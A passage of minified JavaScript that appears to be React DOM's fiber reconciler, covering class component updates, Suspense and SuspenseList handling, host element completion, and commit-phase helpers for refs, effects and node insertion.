        var s = i.context,
            u = n.contextType;
        typeof u == "object" && u !== null ? u = He(u) : (u = Te(n) ? ln : ve.current, u = Mn(t, u));
        var f = n.getDerivedStateFromProps,
            h = typeof f == "function" || typeof i.getSnapshotBeforeUpdate == "function";
        h || typeof i.UNSAFE_componentWillReceiveProps != "function" && typeof i.componentWillReceiveProps != "function" || (a !== r || s !== u) && Is(t, i, r, u), Ct = !1;
        var m = t.memoizedState;
        i.state = m, Ul(t, r, i, l), s = t.memoizedState, a !== r || m !== s || Ce.current || Ct ? (typeof f == "function" && (Pi(t, n, f, r), s = t.memoizedState), (a = Ct || Ds(t, n, a, r, m, s, u)) ? (h || typeof i.UNSAFE_componentWillMount != "function" && typeof i.componentWillMount != "function" || (typeof i.componentWillMount == "function" && i.componentWillMount(), typeof i.UNSAFE_componentWillMount == "function" && i.UNSAFE_componentWillMount()), typeof i.componentDidMount == "function" && (t.flags |= 4194308)) : (typeof i.componentDidMount == "function" && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = s), i.props = r, i.state = s, i.context = u, r = a) : (typeof i.componentDidMount == "function" && (t.flags |= 4194308), r = !1)
    } else {
        i = t.stateNode, Tc(e, t), a = t.memoizedProps, u = t.type === t.elementType ? a : Ye(t.type, a), i.props = u, h = t.pendingProps, m = i.context, s = n.contextType, typeof s == "object" && s !== null ? s = He(s) : (s = Te(n) ? ln : ve.current, s = Mn(t, s));
        var y = n.getDerivedStateFromProps;
        (f = typeof y == "function" || typeof i.getSnapshotBeforeUpdate == "function") || typeof i.UNSAFE_componentWillReceiveProps != "function" && typeof i.componentWillReceiveProps != "function" || (a !== h || m !== s) && Is(t, i, r, s), Ct = !1, m = t.memoizedState, i.state = m, Ul(t, r, i, l);
        var w = t.memoizedState;
        a !== h || m !== w || Ce.current || Ct ? (typeof y == "function" && (Pi(t, n, y, r), w = t.memoizedState), (u = Ct || Ds(t, n, u, r, m, w, s) || !1) ? (f || typeof i.UNSAFE_componentWillUpdate != "function" && typeof i.componentWillUpdate != "function" || (typeof i.componentWillUpdate == "function" && i.componentWillUpdate(r, w, s), typeof i.UNSAFE_componentWillUpdate == "function" && i.UNSAFE_componentWillUpdate(r, w, s)), typeof i.componentDidUpdate == "function" && (t.flags |= 4), typeof i.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024)) : (typeof i.componentDidUpdate != "function" || a === e.memoizedProps && m === e.memoizedState || (t.flags |= 4), typeof i.getSnapshotBeforeUpdate != "function" || a === e.memoizedProps && m === e.memoizedState || (t.flags |= 1024), t.memoizedProps = r, t.memoizedState = w), i.props = r, i.state = w, i.context = s, r = u) : (typeof i.componentDidUpdate != "function" || a === e.memoizedProps && m === e.memoizedState || (t.flags |= 4), typeof i.getSnapshotBeforeUpdate != "function" || a === e.memoizedProps && m === e.memoizedState || (t.flags |= 1024), r = !1)
    }
    return Li(e, t, n, r, o, l)
}

function Li(e, t, n, r, l, o) {
    nd(e, t);
    var i = (t.flags & 128) !== 0;
    if (!r && !i) return l && Fs(t, n, !1), wt(e, t, o);
    r = t.stateNode, Xp.current = t;
    var a = i && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return t.flags |= 1, e !== null && i ? (t.child = Dn(t, e.child, null, o), t.child = Dn(t, null, a, o)) : we(e, t, a, o), t.memoizedState = r.state, l && Fs(t, n, !0), t.child
}

function rd(e) {
    var t = e.stateNode;
    t.pendingContext ? Ls(e, t.pendingContext, t.pendingContext !== t.context) : t.context && Ls(e, t.context, !1), Ea(e, t.containerInfo)
}

function Gs(e, t, n, r, l) {
    return zn(), ya(l), t.flags |= 256, we(e, t, n, r), t.child
}
var Fi = {
    dehydrated: null,
    treeContext: null,
    retryLane: 0
};

function Oi(e) {
    return {
        baseLanes: e,
        cachePool: null,
        transitions: null
    }
}

function ld(e, t, n) {
    var r = t.pendingProps,
        l = V.current,
        o = !1,
        i = (t.flags & 128) !== 0,
        a;
    if ((a = i) || (a = e !== null && e.memoizedState === null ? !1 : (l & 2) !== 0), a ? (o = !0, t.flags &= -129) : (e === null || e.memoizedState !== null) && (l |= 1), W(V, l & 1), e === null) return Ci(t), e = t.memoizedState, e !== null && (e = e.dehydrated, e !== null) ? (t.mode & 1 ? e.data === "$!" ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1, null) : (i = r.children, e = r.fallback, o ? (r = t.mode, o = t.child, i = {
        mode: "hidden",
        children: i
    }, !(r & 1) && o !== null ? (o.childLanes = 0, o.pendingProps = i) : o = co(i, r, 0, null), e = nn(e, r, n, null), o.return = t, e.return = t, o.sibling = e, t.child = o, t.child.memoizedState = Oi(n), t.memoizedState = Fi, e) : La(t, i));
    if (l = e.memoizedState, l !== null && (a = l.dehydrated, a !== null)) return Zp(e, t, i, r, a, l, n);
    if (o) {
        o = r.fallback, i = t.mode, l = e.child, a = l.sibling;
        var s = {
            mode: "hidden",
            children: r.children
        };
        return !(i & 1) && t.child !== l ? (r = t.child, r.childLanes = 0, r.pendingProps = s, t.deletions = null) : (r = At(l, s), r.subtreeFlags = l.subtreeFlags & 14680064), a !== null ? o = At(a, o) : (o = nn(o, i, n, null), o.flags |= 2), o.return = t, r.return = t, r.sibling = o, t.child = r, r = o, o = t.child, i = e.child.memoizedState, i = i === null ? Oi(n) : {
            baseLanes: i.baseLanes | n,
            cachePool: null,
            transitions: i.transitions
        }, o.memoizedState = i, o.childLanes = e.childLanes & ~n, t.memoizedState = Fi, r
    }
    return o = e.child, e = o.sibling, r = At(o, {
        mode: "visible",
        children: r.children
    }), !(t.mode & 1) && (r.lanes = n), r.return = t, r.sibling = null, e !== null && (n = t.deletions, n === null ? (t.deletions = [e], t.flags |= 16) : n.push(e)), t.child = r, t.memoizedState = null, r
}

function La(e, t) {
    return t = co({
        mode: "visible",
        children: t
    }, e.mode, 0, null), t.return = e, e.child = t
}

function sl(e, t, n, r) {
    return r !== null && ya(r), Dn(t, e.child, null, n), e = La(t, t.pendingProps.children), e.flags |= 2, t.memoizedState = null, e
}

function Zp(e, t, n, r, l, o, i) {
    if (n) return t.flags & 256 ? (t.flags &= -257, r = Wo(Error(S(422))), sl(e, t, i, r)) : t.memoizedState !== null ? (t.child = e.child, t.flags |= 128, null) : (o = r.fallback, l = t.mode, r = co({
        mode: "visible",
        children: r.children
    }, l, 0, null), o = nn(o, l, i, null), o.flags |= 2, r.return = t, o.return = t, r.sibling = o, t.child = r, t.mode & 1 && Dn(t, e.child, null, i), t.child.memoizedState = Oi(i), t.memoizedState = Fi, o);
    if (!(t.mode & 1)) return sl(e, t, i, null);
    if (l.data === "$!") {
        if (r = l.nextSibling && l.nextSibling.dataset, r) var a = r.dgst;
        return r = a, o = Error(S(419)), r = Wo(o, r, void 0), sl(e, t, i, r)
    }
    if (a = (i & e.childLanes) !== 0, Ne || a) {
        if (r = re, r !== null) {
            switch (i & -i) {
                case 4:
                    l = 2;
                    break;
                case 16:
                    l = 8;
                    break;
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                case 67108864:
                    l = 32;
                    break;
                case 536870912:
                    l = 268435456;
                    break;
                default:
                    l = 0
            }
            l = l & (r.suspendedLanes | i) ? 0 : l, l !== 0 && l !== o.retryLane && (o.retryLane = l, yt(e, l), Je(r, e, l, -1))
        }
        return Da(), r = Wo(Error(S(421))), sl(e, t, i, r)
    }
    return l.data === "$?" ? (t.flags |= 128, t.child = e.child, t = cm.bind(null, e), l._reactRetry = t, null) : (e = o.treeContext, Le = Mt(l.nextSibling), Fe = t, H = !0, Xe = null, e !== null && (Ie[Ae++] = ft, Ie[Ae++] = pt, Ie[Ae++] = on, ft = e.id, pt = e.overflow, on = t), t = La(t, r.children), t.flags |= 4096, t)
}

function Xs(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    r !== null && (r.lanes |= t), Ti(e.return, t, n)
}

function Uo(e, t, n, r, l) {
    var o = e.memoizedState;
    o === null ? e.memoizedState = {
        isBackwards: t,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: l
    } : (o.isBackwards = t, o.rendering = null, o.renderingStartTime = 0, o.last = r, o.tail = n, o.tailMode = l)
}

function od(e, t, n) {
    var r = t.pendingProps,
        l = r.revealOrder,
        o = r.tail;
    if (we(e, t, r.children, n), r = V.current, r & 2) r = r & 1 | 2, t.flags |= 128;
    else {
        if (e !== null && e.flags & 128) e: for (e = t.child; e !== null;) {
            if (e.tag === 13) e.memoizedState !== null && Xs(e, n, t);
            else if (e.tag === 19) Xs(e, n, t);
            else if (e.child !== null) {
                e.child.return = e, e = e.child;
                continue
            }
            if (e === t) break e;
            for (; e.sibling === null;) {
                if (e.return === null || e.return === t) break e;
                e = e.return
            }
            e.sibling.return = e.return, e = e.sibling
        }
        r &= 1
    }
    if (W(V, r), !(t.mode & 1)) t.memoizedState = null;
    else switch (l) {
        case "forwards":
            for (n = t.child, l = null; n !== null;) e = n.alternate, e !== null && Bl(e) === null && (l = n), n = n.sibling;
            n = l, n === null ? (l = t.child, t.child = null) : (l = n.sibling, n.sibling = null), Uo(t, !1, l, n, o);
            break;
        case "backwards":
            for (n = null, l = t.child, t.child = null; l !== null;) {
                if (e = l.alternate, e !== null && Bl(e) === null) {
                    t.child = l;
                    break
                }
                e = l.sibling, l.sibling = n, n = l, l = e
            }
            Uo(t, !0, n, null, o);
            break;
        case "together":
            Uo(t, !1, null, null, void 0);
            break;
        default:
            t.memoizedState = null
    }
    return t.child
}

function Sl(e, t) {
    !(t.mode & 1) && e !== null && (e.alternate = null, t.alternate = null, t.flags |= 2)
}

function wt(e, t, n) {
    if (e !== null && (t.dependencies = e.dependencies), sn |= t.lanes, !(n & t.childLanes)) return null;
    if (e !== null && t.child !== e.child) throw Error(S(153));
    if (t.child !== null) {
        for (e = t.child, n = At(e, e.pendingProps), t.child = n, n.return = t; e.sibling !== null;) e = e.sibling, n = n.sibling = At(e, e.pendingProps), n.return = t;
        n.sibling = null
    }
    return t.child
}

function Jp(e, t, n) {
    switch (t.tag) {
        case 3:
            rd(t), zn();
            break;
        case 5:
            Lc(t);
            break;
        case 1:
            Te(t.type) && zl(t);
            break;
        case 4:
            Ea(t, t.stateNode.containerInfo);
            break;
        case 10:
            var r = t.type._context,
                l = t.memoizedProps.value;
            W(Al, r._currentValue), r._currentValue = l;
            break;
        case 13:
            if (r = t.memoizedState, r !== null) return r.dehydrated !== null ? (W(V, V.current & 1), t.flags |= 128, null) : n & t.child.childLanes ? ld(e, t, n) : (W(V, V.current & 1), e = wt(e, t, n), e !== null ? e.sibling : null);
            W(V, V.current & 1);
            break;
        case 19:
            if (r = (n & t.childLanes) !== 0, e.flags & 128) {
                if (r) return od(e, t, n);
                t.flags |= 128
            }
            if (l = t.memoizedState, l !== null && (l.rendering = null, l.tail = null, l.lastEffect = null), W(V, V.current), r) break;
            return null;
        case 22:
        case 23:
            return t.lanes = 0, td(e, t, n)
    }
    return wt(e, t, n)
}
var id, Ri, ad, sd;
id = function(e, t) {
    for (var n = t.child; n !== null;) {
        if (n.tag === 5 || n.tag === 6) e.appendChild(n.stateNode);
        else if (n.tag !== 4 && n.child !== null) {
            n.child.return = n, n = n.child;
            continue
        }
        if (n === t) break;
        for (; n.sibling === null;) {
            if (n.return === null || n.return === t) return;
            n = n.return
        }
        n.sibling.return = n.return, n = n.sibling
    }
};
Ri = function() {};
ad = function(e, t, n, r) {
    var l = e.memoizedProps;
    if (l !== r) {
        e = t.stateNode, qt(ot.current);
        var o = null;
        switch (n) {
            case "input":
                l = ri(e, l), r = ri(e, r), o = [];
                break;
            case "select":
                l = K({}, l, {
                    value: void 0
                }), r = K({}, r, {
                    value: void 0
                }), o = [];
                break;
            case "textarea":
                l = ii(e, l), r = ii(e, r), o = [];
                break;
            default:
                typeof l.onClick != "function" && typeof r.onClick == "function" && (e.onclick = Rl)
        }
        si(n, r);
        var i;
        n = null;
        for (u in l)
            if (!r.hasOwnProperty(u) && l.hasOwnProperty(u) && l[u] != null)
                if (u === "style") {
                    var a = l[u];
                    for (i in a) a.hasOwnProperty(i) && (n || (n = {}), n[i] = "")
                } else u !== "dangerouslySetInnerHTML" && u !== "children" && u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && u !== "autoFocus" && (kr.hasOwnProperty(u) ? o || (o = []) : (o = o || []).push(u, null));
        for (u in r) {
            var s = r[u];
            if (a = l != null ? l[u] : void 0, r.hasOwnProperty(u) && s !== a && (s != null || a != null))
                if (u === "style")
                    if (a) {
                        for (i in a) !a.hasOwnProperty(i) || s && s.hasOwnProperty(i) || (n || (n = {}), n[i] = "");
                        for (i in s) s.hasOwnProperty(i) && a[i] !== s[i] && (n || (n = {}), n[i] = s[i])
                    } else n || (o || (o = []), o.push(u, n)), n = s;
            else u === "dangerouslySetInnerHTML" ? (s = s ? s.__html : void 0, a = a ? a.__html : void 0, s != null && a !== s && (o = o || []).push(u, s)) : u === "children" ? typeof s != "string" && typeof s != "number" || (o = o || []).push(u, "" + s) : u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && (kr.hasOwnProperty(u) ? (s != null && u === "onScroll" && U("scroll", e), o || a === s || (o = [])) : (o = o || []).push(u, s))
        }
        n && (o = o || []).push("style", n);
        var u = o;
        (t.updateQueue = u) && (t.flags |= 4)
    }
};
sd = function(e, t, n, r) {
    n !== r && (t.flags |= 4)
};

function nr(e, t) {
    if (!H) switch (e.tailMode) {
        case "hidden":
            t = e.tail;
            for (var n = null; t !== null;) t.alternate !== null && (n = t), t = t.sibling;
            n === null ? e.tail = null : n.sibling = null;
            break;
        case "collapsed":
            n = e.tail;
            for (var r = null; n !== null;) n.alternate !== null && (r = n), n = n.sibling;
            r === null ? t || e.tail === null ? e.tail = null : e.tail.sibling = null : r.sibling = null
    }
}

function me(e) {
    var t = e.alternate !== null && e.alternate.child === e.child,
        n = 0,
        r = 0;
    if (t)
        for (var l = e.child; l !== null;) n |= l.lanes | l.childLanes, r |= l.subtreeFlags & 14680064, r |= l.flags & 14680064, l.return = e, l = l.sibling;
    else
        for (l = e.child; l !== null;) n |= l.lanes | l.childLanes, r |= l.subtreeFlags, r |= l.flags, l.return = e, l = l.sibling;
    return e.subtreeFlags |= r, e.childLanes = n, t
}

function qp(e, t, n) {
    var r = t.pendingProps;
    switch (ga(t), t.tag) {
        case 2:
        case 16:
        case 15:
        case 0:
        case 11:
        case 7:
        case 8:
        case 12:
        case 9:
        case 14:
            return me(t), null;
        case 1:
            return Te(t.type) && Ml(), me(t), null;
        case 3:
            return r = t.stateNode, In(), B(Ce), B(ve), Ca(), r.pendingContext && (r.context = r.pendingContext, r.pendingContext = null), (e === null || e.child === null) && (il(t) ? t.flags |= 4 : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024, Xe !== null && (Bi(Xe), Xe = null))), Ri(e, t), me(t), null;
        case 5:
            Na(t);
            var l = qt(Fr.current);
            if (n = t.type, e !== null && t.stateNode != null) ad(e, t, n, r, l), e.ref !== t.ref && (t.flags |= 512, t.flags |= 2097152);
            else {
                if (!r) {
                    if (t.stateNode === null) throw Error(S(166));
                    return me(t), null
                }
                if (e = qt(ot.current), il(t)) {
                    r = t.stateNode, n = t.type;
                    var o = t.memoizedProps;
                    switch (r[rt] = t, r[$r] = o, e = (t.mode & 1) !== 0, n) {
                        case "dialog":
                            U("cancel", r), U("close", r);
                            break;
                        case "iframe":
                        case "object":
                        case "embed":
                            U("load", r);
                            break;
                        case "video":
                        case "audio":
                            for (l = 0; l < ur.length; l++) U(ur[l], r);
                            break;
                        case "source":
                            U("error", r);
                            break;
                        case "img":
                        case "image":
                        case "link":
                            U("error", r), U("load", r);
                            break;
                        case "details":
                            U("toggle", r);
                            break;
                        case "input":
                            os(r, o), U("invalid", r);
                            break;
                        case "select":
                            r._wrapperState = {
                                wasMultiple: !!o.multiple
                            }, U("invalid", r);
                            break;
                        case "textarea":
                            as(r, o), U("invalid", r)
                    }
                    si(n, o), l = null;
                    for (var i in o)
                        if (o.hasOwnProperty(i)) {
                            var a = o[i];
                            i === "children" ? typeof a == "string" ? r.textContent !== a && (o.suppressHydrationWarning !== !0 && ol(r.textContent, a, e), l = ["children", a]) : typeof a == "number" && r.textContent !== "" + a && (o.suppressHydrationWarning !== !0 && ol(r.textContent, a, e), l = ["children", "" + a]) : kr.hasOwnProperty(i) && a != null && i === "onScroll" && U("scroll", r)
                        }
                    switch (n) {
                        case "input":
                            Zr(r), is(r, o, !0);
                            break;
                        case "textarea":
                            Zr(r), ss(r);
                            break;
                        case "select":
                        case "option":
                            break;
                        default:
                            typeof o.onClick == "function" && (r.onclick = Rl)
                    }
                    r = l, t.updateQueue = r, r !== null && (t.flags |= 4)
                } else {
                    i = l.nodeType === 9 ? l : l.ownerDocument, e === "http://www.w3.org/1999/xhtml" && (e = Ru(n)), e === "http://www.w3.org/1999/xhtml" ? n === "script" ? (e = i.createElement("div"), e.innerHTML = "<script><\/script>", e = e.removeChild(e.firstChild)) : typeof r.is == "string" ? e = i.createElement(n, {
                        is: r.is
                    }) : (e = i.createElement(n), n === "select" && (i = e, r.multiple ? i.multiple = !0 : r.size && (i.size = r.size))) : e = i.createElementNS(e, n), e[rt] = t, e[$r] = r, id(e, t, !1, !1), t.stateNode = e;
                    e: {
                        switch (i = ui(n, r), n) {
                            case "dialog":
                                U("cancel", e), U("close", e), l = r;
                                break;
                            case "iframe":
                            case "object":
                            case "embed":
                                U("load", e), l = r;
                                break;
                            case "video":
                            case "audio":
                                for (l = 0; l < ur.length; l++) U(ur[l], e);
                                l = r;
                                break;
                            case "source":
                                U("error", e), l = r;
                                break;
                            case "img":
                            case "image":
                            case "link":
                                U("error", e), U("load", e), l = r;
                                break;
                            case "details":
                                U("toggle", e), l = r;
                                break;
                            case "input":
                                os(e, r), l = ri(e, r), U("invalid", e);
                                break;
                            case "option":
                                l = r;
                                break;
                            case "select":
                                e._wrapperState = {
                                    wasMultiple: !!r.multiple
                                }, l = K({}, r, {
                                    value: void 0
                                }), U("invalid", e);
                                break;
                            case "textarea":
                                as(e, r), l = ii(e, r), U("invalid", e);
                                break;
                            default:
                                l = r
                        }
                        si(n, l),
                        a = l;
                        for (o in a)
                            if (a.hasOwnProperty(o)) {
                                var s = a[o];
                                o === "style" ? Du(e, s) : o === "dangerouslySetInnerHTML" ? (s = s ? s.__html : void 0, s != null && Mu(e, s)) : o === "children" ? typeof s == "string" ? (n !== "textarea" || s !== "") && Sr(e, s) : typeof s == "number" && Sr(e, "" + s) : o !== "suppressContentEditableWarning" && o !== "suppressHydrationWarning" && o !== "autoFocus" && (kr.hasOwnProperty(o) ? s != null && o === "onScroll" && U("scroll", e) : s != null && na(e, o, s, i))
                            }
                        switch (n) {
                            case "input":
                                Zr(e), is(e, r, !1);
                                break;
                            case "textarea":
                                Zr(e), ss(e);
                                break;
                            case "option":
                                r.value != null && e.setAttribute("value", "" + Wt(r.value));
                                break;
                            case "select":
                                e.multiple = !!r.multiple, o = r.value, o != null ? jn(e, !!r.multiple, o, !1) : r.defaultValue != null && jn(e, !!r.multiple, r.defaultValue, !0);
                                break;
                            default:
                                typeof l.onClick == "function" && (e.onclick = Rl)
                        }
                        switch (n) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                r = !!r.autoFocus;
                                break e;
                            case "img":
                                r = !0;
                                break e;
                            default:
                                r = !1
                        }
                    }
                    r && (t.flags |= 4)
                }
                t.ref !== null && (t.flags |= 512, t.flags |= 2097152)
            }
            return me(t), null;
        case 6:
            if (e && t.stateNode != null) sd(e, t, e.memoizedProps, r);
            else {
                if (typeof r != "string" && t.stateNode === null) throw Error(S(166));
                if (n = qt(Fr.current), qt(ot.current), il(t)) {
                    if (r = t.stateNode, n = t.memoizedProps, r[rt] = t, (o = r.nodeValue !== n) && (e = Fe, e !== null)) switch (e.tag) {
                        case 3:
                            ol(r.nodeValue, n, (e.mode & 1) !== 0);
                            break;
                        case 5:
                            e.memoizedProps.suppressHydrationWarning !== !0 && ol(r.nodeValue, n, (e.mode & 1) !== 0)
                    }
                    o && (t.flags |= 4)
                } else r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r), r[rt] = t, t.stateNode = r
            }
            return me(t), null;
        case 13:
            if (B(V), r = t.memoizedState, e === null || e.memoizedState !== null && e.memoizedState.dehydrated !== null) {
                if (H && Le !== null && t.mode & 1 && !(t.flags & 128)) Nc(), zn(), t.flags |= 98560, o = !1;
                else if (o = il(t), r !== null && r.dehydrated !== null) {
                    if (e === null) {
                        if (!o) throw Error(S(318));
                        if (o = t.memoizedState, o = o !== null ? o.dehydrated : null, !o) throw Error(S(317));
                        o[rt] = t
                    } else zn(), !(t.flags & 128) && (t.memoizedState = null), t.flags |= 4;
                    me(t), o = !1
                } else Xe !== null && (Bi(Xe), Xe = null), o = !0;
                if (!o) return t.flags & 65536 ? t : null
            }
            return t.flags & 128 ? (t.lanes = n, t) : (r = r !== null, r !== (e !== null && e.memoizedState !== null) && r && (t.child.flags |= 8192, t.mode & 1 && (e === null || V.current & 1 ? te === 0 && (te = 3) : Da())), t.updateQueue !== null && (t.flags |= 4), me(t), null);
        case 4:
            return In(), Ri(e, t), e === null && jr(t.stateNode.containerInfo), me(t), null;
        case 10:
            return ka(t.type._context), me(t), null;
        case 17:
            return Te(t.type) && Ml(), me(t), null;
        case 19:
            if (B(V), o = t.memoizedState, o === null) return me(t), null;
            if (r = (t.flags & 128) !== 0, i = o.rendering, i === null)
                if (r) nr(o, !1);
                else {
                    if (te !== 0 || e !== null && e.flags & 128)
                        for (e = t.child; e !== null;) {
                            if (i = Bl(e), i !== null) {
                                for (t.flags |= 128, nr(o, !1), r = i.updateQueue, r !== null && (t.updateQueue = r, t.flags |= 4), t.subtreeFlags = 0, r = n, n = t.child; n !== null;) o = n, e = r, o.flags &= 14680066, i = o.alternate, i === null ? (o.childLanes = 0, o.lanes = e, o.child = null, o.subtreeFlags = 0, o.memoizedProps = null, o.memoizedState = null, o.updateQueue = null, o.dependencies = null, o.stateNode = null) : (o.childLanes = i.childLanes, o.lanes = i.lanes, o.child = i.child, o.subtreeFlags = 0, o.deletions = null, o.memoizedProps = i.memoizedProps, o.memoizedState = i.memoizedState, o.updateQueue = i.updateQueue, o.type = i.type, e = i.dependencies, o.dependencies = e === null ? null : {
                                    lanes: e.lanes,
                                    firstContext: e.firstContext
                                }), n = n.sibling;
                                return W(V, V.current & 1 | 2), t.child
                            }
                            e = e.sibling
                        }
                    o.tail !== null && X() > Wn && (t.flags |= 128, r = !0, nr(o, !1), t.lanes = 4194304)
                }
            else {
                if (!r)
                    if (e = Bl(i), e !== null) {
                        if (t.flags |= 128, r = !0, n = e.updateQueue, n !== null && (t.updateQueue = n, t.flags |= 4), nr(o, !0), o.tail === null && o.tailMode === "hidden" && !i.alternate && !H) return me(t), null
                    } else 2 * X() - o.renderingStartTime > Wn && n !== 1073741824 && (t.flags |= 128, r = !0, nr(o, !1), t.lanes = 4194304);
                o.isBackwards ? (i.sibling = t.child, t.child = i) : (n = o.last, n !== null ? n.sibling = i : t.child = i, o.last = i)
            }
            return o.tail !== null ? (t = o.tail, o.rendering = t, o.tail = t.sibling, o.renderingStartTime = X(), t.sibling = null, n = V.current, W(V, r ? n & 1 | 2 : n & 1), t) : (me(t), null);
        case 22:
        case 23:
            return za(), r = t.memoizedState !== null, e !== null && e.memoizedState !== null !== r && (t.flags |= 8192), r && t.mode & 1 ? _e & 1073741824 && (me(t), t.subtreeFlags & 6 && (t.flags |= 8192)) : me(t), null;
        case 24:
            return null;
        case 25:
            return null
    }
    throw Error(S(156, t.tag))
}

function em(e, t) {
    switch (ga(t), t.tag) {
        case 1:
            return Te(t.type) && Ml(), e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
        case 3:
            return In(), B(Ce), B(ve), Ca(), e = t.flags, e & 65536 && !(e & 128) ? (t.flags = e & -65537 | 128, t) : null;
        case 5:
            return Na(t), null;
        case 13:
            if (B(V), e = t.memoizedState, e !== null && e.dehydrated !== null) {
                if (t.alternate === null) throw Error(S(340));
                zn()
            }
            return e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
        case 19:
            return B(V), null;
        case 4:
            return In(), null;
        case 10:
            return ka(t.type._context), null;
        case 22:
        case 23:
            return za(), null;
        case 24:
            return null;
        default:
            return null
    }
}
var ul = !1,
    he = !1,
    tm = typeof WeakSet == "function" ? WeakSet : Set,
    _ = null;

function Nn(e, t) {
    var n = e.ref;
    if (n !== null)
        if (typeof n == "function") try {
            n(null)
        } catch (r) {
            G(e, t, r)
        } else n.current = null
}

function Mi(e, t, n) {
    try {
        n()
    } catch (r) {
        G(e, t, r)
    }
}
var Zs = !1;

function nm(e, t) {
    if (wi = Ll, e = fc(), ha(e)) {
        if ("selectionStart" in e) var n = {
            start: e.selectionStart,
            end: e.selectionEnd
        };
        else e: {
            n = (n = e.ownerDocument) && n.defaultView || window;
            var r = n.getSelection && n.getSelection();
            if (r && r.rangeCount !== 0) {
                n = r.anchorNode;
                var l = r.anchorOffset,
                    o = r.focusNode;
                r = r.focusOffset;
                try {
                    n.nodeType, o.nodeType
                } catch {
                    n = null;
                    break e
                }
                var i = 0,
                    a = -1,
                    s = -1,
                    u = 0,
                    f = 0,
                    h = e,
                    m = null;
                t: for (;;) {
                    for (var y; h !== n || l !== 0 && h.nodeType !== 3 || (a = i + l), h !== o || r !== 0 && h.nodeType !== 3 || (s = i + r), h.nodeType === 3 && (i += h.nodeValue.length), (y = h.firstChild) !== null;) m = h, h = y;
                    for (;;) {
                        if (h === e) break t;
                        if (m === n && ++u === l && (a = i), m === o && ++f === r && (s = i), (y = h.nextSibling) !== null) break;
                        h = m, m = h.parentNode
                    }
                    h = y
                }
                n = a === -1 || s === -1 ? null : {
                    start: a,
                    end: s
                }
            } else n = null
        }
        n = n || {
            start: 0,
            end: 0
        }
    } else n = null;
    for (xi = {
            focusedElem: e,
            selectionRange: n
        }, Ll = !1, _ = t; _ !== null;)
        if (t = _, e = t.child, (t.subtreeFlags & 1028) !== 0 && e !== null) e.return = t, _ = e;
        else
            for (; _ !== null;) {
                t = _;
                try {
                    var w = t.alternate;
                    if (t.flags & 1024) switch (t.tag) {
                        case 0:
                        case 11:
                        case 15:
                            break;
                        case 1:
                            if (w !== null) {
                                var x = w.memoizedProps,
                                    N = w.memoizedState,
                                    d = t.stateNode,
                                    c = d.getSnapshotBeforeUpdate(t.elementType === t.type ? x : Ye(t.type, x), N);
                                d.__reactInternalSnapshotBeforeUpdate = c
                            }
                            break;
                        case 3:
                            var p = t.stateNode.containerInfo;
                            p.nodeType === 1 ? p.textContent = "" : p.nodeType === 9 && p.documentElement && p.removeChild(p.documentElement);
                            break;
                        case 5:
                        case 6:
                        case 4:
                        case 17:
                            break;
                        default:
                            throw Error(S(163))
                    }
                } catch (k) {
                    G(t, t.return, k)
                }
                if (e = t.sibling, e !== null) {
                    e.return = t.return, _ = e;
                    break
                }
                _ = t.return
            }
    return w = Zs, Zs = !1, w
}

function gr(e, t, n) {
    var r = t.updateQueue;
    if (r = r !== null ? r.lastEffect : null, r !== null) {
        var l = r = r.next;
        do {
            if ((l.tag & e) === e) {
                var o = l.destroy;
                l.destroy = void 0, o !== void 0 && Mi(t, n, o)
            }
            l = l.next
        } while (l !== r)
    }
}

function so(e, t) {
    if (t = t.updateQueue, t = t !== null ? t.lastEffect : null, t !== null) {
        var n = t = t.next;
        do {
            if ((n.tag & e) === e) {
                var r = n.create;
                n.destroy = r()
            }
            n = n.next
        } while (n !== t)
    }
}

function zi(e) {
    var t = e.ref;
    if (t !== null) {
        var n = e.stateNode;
        switch (e.tag) {
            case 5:
                e = n;
                break;
            default:
                e = n
        }
        typeof t == "function" ? t(e) : t.current = e
    }
}

function ud(e) {
    var t = e.alternate;
    t !== null && (e.alternate = null, ud(t)), e.child = null, e.deletions = null, e.sibling = null, e.tag === 5 && (t = e.stateNode, t !== null && (delete t[rt], delete t[$r], delete t[bi], delete t[Dp], delete t[Ip])), e.stateNode = null, e.return = null, e.dependencies = null, e.memoizedProps = null, e.memoizedState = null, e.pendingProps = null, e.stateNode = null, e.updateQueue = null
}

function cd(e) {
    return e.tag === 5 || e.tag === 3 || e.tag === 4
}

function Js(e) {
    e: for (;;) {
        for (; e.sibling === null;) {
            if (e.return === null || cd(e.return)) return null;
            e = e.return
        }
        for (e.sibling.return = e.return, e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18;) {
            if (e.flags & 2 || e.child === null || e.tag === 4) continue e;
            e.child.return = e, e = e.child
        }
        if (!(e.flags & 2)) return e.stateNode
    }
}

function Di(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6) e = e.stateNode, t ? n.nodeType === 8 ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (n.nodeType === 8 ? (t = n.parentNode, t.insertBefore(e, n)) : (t = n, t.appendChild(e)), n = n._reactRootContainer, n != null || t.onclick !== null || (t.onclick = Rl));
    else if (r !== 4 && (e = e.child, e !== null))
        for (Di(e, t, n), e = e.sibling; e !== null;) Di(e, t, n), e = e.sibling
}

function Ii(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6) e = e.stateNode, t ? n.insertBefore(e, t) : n.appendChild(e);
    else if (r !== 4 && (e = e.child, e !== null))
        for (Ii(e, t, n), e = e.sibling; e !== null;) Ii(e, t, n), e = e.sibling
}
var ae = null,
    Ge = !1;

function bt(e, t, n) {
